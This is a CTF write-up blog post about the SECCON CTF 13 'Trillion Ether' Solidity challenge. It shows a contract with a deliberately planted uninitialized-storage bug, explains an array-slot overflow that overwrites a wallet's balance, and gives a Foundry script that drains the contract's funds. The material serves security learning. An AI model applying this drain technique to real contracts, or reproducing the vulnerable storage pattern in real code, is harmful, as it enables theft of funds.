---
layout: post
title: "SECCON CTF 13 Quals Blockchain Writeup"
categories: 
  - Writeup
  - blockchain
author: Songhyun Bae
---

Hi! I recently participated in the [SECCON CTF 13 Qualifiers](https://ctftime.org/event/2478/) with [CyKor](https://x.com/cykorku) and solved the “Trillion Ether” challenge in the Blockchain category.

In this post, I’d like to share my solution to this challenge. You can find the problem on [Alpacahack](https://alpacahack.com/ctfs/seccon-13-quals/challenges/trillion-ether).

---

## Trillion Ether

> Get Chance!

Below is the complete code for this challenge. As indicated by the `isSolved` function, the goal is to drain all of the contract’s assets:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract TrillionEther {
    struct Wallet {
        bytes32 name;
        uint256 balance;
        address owner;
    }

    Wallet[] public wallets;

    constructor() payable {
        require(msg.value == 1_000_000_000_000 ether);
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }

    function createWallet(bytes32 name) external payable {
        wallets.push(_newWallet(name, msg.value, msg.sender));
    }

    function transfer(uint256 fromWalletId, uint256 toWalletId, uint256 amount) external {
        require(wallets[fromWalletId].owner == msg.sender, "not owner");
        wallets[fromWalletId].balance -= amount;
        wallets[toWalletId].balance += amount;
    }

    function withdraw(uint256 walletId, uint256 amount) external {
        require(wallets[walletId].owner == msg.sender, "not owner");
        wallets[walletId].balance -= amount;
        payable(wallets[walletId].owner).transfer(amount);
    }

    function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
        wallet = wallet;
        wallet.name = name;
        wallet.balance = balance;
        wallet.owner = owner;
    }
}
```
<br>

At first glance, there’s a clear vulnerability in the `_newWallet` function due to its use of an uninitialized storage variable.

```solidity
function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
    wallet = wallet;
    wallet.name = name;
    wallet.balance = balance;
    wallet.owner = owner;
}
```

declares `wallet` as a storage variable but never properly initializes it, causing the assignment to write directly to storage `slot 0`.

<br>

I initially thought this vulnerability alone would be enough to solve the problem, but it turned out to be more complicated.

<br>

Inside the TrillionEther contract, `slot 0` is used to store the length of the dynamic wallets array, while the actual wallet data begins at `keccak256(0)` (because the wallets array is declared in `slot 0`):

```
$ forge inspect TrillionEther storage-layout --pretty
| Name    | Type                          | Slot | Offset | Bytes | Contract                            |
|---------|-------------------------------|------|--------|-------|-------------------------------------|
| wallets | struct TrillionEther.Wallet[] | 0    | 0      | 32    | src/TrillionEther.sol:TrillionEther |
```

Therefore, simply overwriting `slot 0` lets you modify the length of the `wallets` array. The challenge is to combine this with a method to drain the contract’s entire balance.

<br>

First, each element of the wallets array is a Wallet struct occupying three storage slots:

```solidity
struct Wallet {
    bytes32 name;
    uint256 balance;
    address owner;
}

Wallet[] public wallets;
```

When `wallets.push(...)` is executed, the storage index for the new struct is calculated roughly by:

```solidity
keccak256(0) + arrayLength * 3
```

<br>

Let’s consider what happens if `arrayLength` becomes so large that multiplying it by 3 causes an overflow. In that case, `arrayLength * 3` would wrap around to a much smaller value than expected, potentially allowing us to write data to an unintended storage location—like setting the balance to an address or owner address.

Since values in the contract are calculated using `uint256`, if `arrayLength * 3` exceeds `type(uint256).max`, an overflow is likely to occur.

<br>

This hypothesis turned out to be correct. I was able to overwrite the `balance` value of a specific Wallet struct in the wallets array with either the `owner` or `name` variable.

<br>

Now, the next step was to calculate the exact point. First, I determined the value that would trigger an overflow. Since `type(uint256).max` is perfectly divisible by 3, passing this value as an argument to the `createWallet` function should successfully cause the overflow.

```solidity
uint256 maxUint = type(uint256).max;
uint256 n = maxUint / 3;
console.log(n);
// 38597363079105398474523661669562635951089994888546854679819194669304376546645
```

<br>

When visualized, it looks like this:
<img width="1300" alt="image" src="https://github.com/user-attachments/assets/2a921479-9bfe-4d16-b739-fcd8ae639980" />


<br>

So, I was able to overwrite the balance value with the owner address. To exploit this, I first created a `wallet` at index 1, where I was the owner, and then created another `wallet` at position `(maxUint / 3) + 1`, which allowed me to execute the attack.

<br>

### Solution Script

This is my solution script based on the above approach.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

import {TrillionEther} from "../src/TrillionEther.sol";

contract solve is Script {
    uint256 playerPrivateKey;
    address player;

    TrillionEther problemInstance;

    function setUp() external {
        string memory rpcUrl = "http://trillion-ether.seccon.games:8545/fcf85a4f-6b2f-4f81-aef5-e966d043277f";
        playerPrivateKey = 0x6d9be7bb251e23e43ac737e9ce272c97d11eb2d8164b70fd92242a076eab0d30;
        address problemContract = 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        problemInstance = TrillionEther(problemContract);
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        problemInstance.createWallet{value: 0}(bytes32(uint256(1)));
        problemInstance.createWallet{value: 0}(bytes32(uint256(38597363079105398474523661669562635951089994888546854679819194669304376546646)));

        problemInstance.withdraw(1, address(problemInstance).balance);

        vm.stopBroadcast();
    }
}
```
